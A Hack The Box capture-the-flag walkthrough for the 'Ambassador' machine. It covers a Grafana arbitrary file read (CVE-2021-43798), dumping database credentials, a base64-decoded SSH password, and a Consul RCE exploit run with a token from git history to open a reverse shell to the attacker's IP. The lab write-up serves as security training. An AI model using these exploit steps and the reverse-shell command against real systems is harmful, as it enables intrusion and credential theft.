---
title: HTB - Ambassador
author: nirajkharel
date: 2023-01-30 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — Ambassador
================

A detailed walkthrough for solving Ambassador Box on Hack The Box. The box contains vulnerability like Arbitrary File Read CVE-[2021–43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798), weak encryption and Remote Code Execution on consul.

<img alt="" class="bf jp jq dj" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*s0bTWtngRQisodmZFEQqkA.png" width="700" height="529">

Enumeration
===========

**NMAP**

```bash
nmap -sC -sV -oA nmap/10.10.11.183 10.10.11.183 -vv
```

```bash
Discovered open port 3306/tcp on 10.10.11.183  
Discovered open port 22/tcp on 10.10.11.183  
Discovered open port 80/tcp on 10.10.11.183  
Discovered open port 3000/tcp on 10.10.11.183
```

Add 10.10.11.183 on /etc/hosts as ambassador.htb. Nothing much found on the web application. Let’s enumerate the directory.

**Directory Busting**

```bash
python3 dirsearch.py -u http://ambassador.htb/  
  
\[19:19:35\] 200 -    2KB - /404.html  
\[19:20:00\] 301 -  321B  - /categories  ->  http://ambassador.htb/categories/  
\[19:20:15\] 200 -  995B  - /images/  
\[19:20:15\] 301 -  317B  - /images  ->  http://ambassador.htb/images/  
\[19:20:16\] 200 -    4KB - /index.html  
\[19:20:16\] 200 -    1KB - /index.xml  
\[19:20:32\] 301 -  316B  - /posts  ->  http://ambassador.htb/posts/  
\[19:20:37\] 403 -  279B  - /server-status/  
\[19:20:37\] 403 -  279B  - /server-status  
\[19:20:40\] 200 -  645B  - /sitemap.xml  
\[19:20:43\] 301 -  315B  - /tags  ->  http://ambassador.htb/tags/
```

```bash
gobuster dir -u http://ambassador.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  
  
/images               (Status: 301) \[Size: 317\] \[--> http://ambassador.htb/images/\]  
/categories           (Status: 301) \[Size: 321\] \[--> http://ambassador.htb/categories/\]  
/posts                (Status: 301) \[Size: 316\] \[--> http://ambassador.htb/posts/\]  
/tags                 (Status: 301) \[Size: 315\] \[--> http://ambassador.htb/tags/\]
```

Navigate to the discovered directories, didn’t find any of the interesting where I could get an initial foothold. But when I navigated to the blog, I can get the SSH username ‘developer’ where it says that the password will be given by DevOps.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*9tva6nEouyNmZvJqEe4puw.png" width="700" height="372">

**Subdomain Enumeration**

```bash
ffuf -w ~/arsenal/web/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://ambassador.htb/ -H "Host: FUZZ.ambassador.htb" -fw 80
```

Didn’t discover any of the subdomains.

Let’s open the port 3000 on a browser. We can find that the application has installed Grafana which is a multi-platform open source analytics and interactive visualization web application. (From Wikipedia). The version of the Grafana installed is v8.2.0 which is vulnerable to Directory Traversal and Arbitrary File Read (CVE-[2021–43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798)).

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*Chm6pBM0KytxUrigXH1E9g.png" width="700" height="159">

**Exploitation**

Download the Grafana Exploit from [https://www.exploit-db.com/exploits/50581](https://www.exploit-db.com/exploits/50581).

Enter the command as below

```bash
python3 50581.py -H http://ambassador.htb:3000
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*M7A83C1904r0fZKGwiSBrQ.png" width="700" height="735">

With an exploitation of it, the vulnerability is confirmed. Supply the path like **/etc/grafana/grafana.ini** on the script, we can find an admin credentials for Grafana login panel as well.

Pass /etc/grafana/grafana.ini on the above script.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*tbKwluoDmS54gnUs1eOkWQ.png" width="700" height="253">

We also know that when Grafana is installed, it creates the database under directory **/var/lib/grafana/grafana.db.** Let’s download the database file and view if we could get any more information. The above script does not download the file.

Run this exploit to download the grafana.db [https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)

```bash
git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798  
cd exploit-grafana-CVE-2021-43798  
pip install -r requirements.txt  
  
\# Collect all Grafana URLs in a single file. For example: targets.txt  
python3 exploit.py  
  
\# It will download the file 
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*BUk3ypayBLVMbDB1Fms07w.png" width="700" height="431">

Copy the grafana.db from ./http\_ambassador\_htb\_3000/grafana.db to your current working directory and connect to the db file with sqlite3.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*m1Exqsp5HaSLtbH_ADNhrA.png" width="700" height="651">

There is a table called data\_source. Dump the table. We can find a mysql password there.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*gi24zRZxcYtQ_9qNEhQzJA.png" width="700" height="334">

Connect to the MySQL database.

```bash
mysql -h 10.10.11.183 -u grafana -p  
  
#Password: dontStandSoCloseToMe63221!
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*113LPXj1S_84DzI_DmzRYQ.png" width="700" height="305">

Use database whackywidget and dump the datas from table users.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*tKLZx7CnvLzcgEQ1U_y-nw.png" width="700" height="470">

We can find the developer password encoded on base64. Decode it to get the plaintext.

```bash
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d  
  
\# Output: anEnglishManInNewYork027468
```

**SSH as developer**

Connect to the machine with SSH using developer credentials.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*NpH6FCMjAYosTFuzMlvQXw.png" width="700" height="185">

Here you will get your user flag.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*m2Ajd22vH-NjyMsdfdJwfQ.png" width="700" height="162">

**Privilege Escalation**

[Download linpeas and run it on your box.](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

There were some CVEs displayed by linpeas but non of them worked for escalation. I started navigating and analysing the directories manually. In a process I found /opt/my-app directory. Tried to list all the files and folders including hidden on it, I found .git directory. Therefore I tried to view the git logs on it.

Note: Always look for the git logs if .git folder is present on it. There might be some recent commits performed by the user and it can contain some crucial information.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*nkEgswSeoAJBI1CdvPZ5Sg.png" width="700" height="206">

Viewing the logs, I found four different commit. Viewing all the commits, I found the consul is installed on it. Consul is some kind of service networking solution and it contains a code execution vulnerability.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*dyg1WqKln2d5Lkf7LKHKSg.png" width="700" height="270">

Download the exploit [https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*s2RCMmZ0G7_x-X8uGFp0LQ.png" width="700" height="175">

Viewing the help commands, we can see that it also need a consul token inorder to exploit.

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*dQ6iK2Wp89d0SEVkqtqKRQ.png" width="700" height="145">

We can find the consul token on the previous **_git show 33a53ef9a207976d5ceceddc41a199558843bf3c_** command which is **_bb03b43b-1d81-d62b-24b5–39540ee469b5._**

Other needed arguments are:

```bash
\--rhost RHOST  remote host  (ip of the victim machine, if not specified, 127.0.0.1 will be used)  
\--rport RPORT  remote port  (port where the consul API is executed, if not specified, 8500 will be used)  
\--lhost LHOST  local host   (ip where the shell will be received)  
\--lport LPORT  local port   (port where the shell will be received)  
\--token TOKEN  acl token    (acl token needed to authenticate with the api)
```

Listen to port 4445 using netcat and run the script.

```bash
python3 exploit.py -rh 127.0.0.1 --rp 8500 -lh 10.10.14.20 -lp 4445 -tk bb03b43b-1d81-d62b-24b5-39540ee469b5
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*AN2ay09MN33NdU06o7KizA.png" width="700" height="147">

Here we go! Happy Hacking.
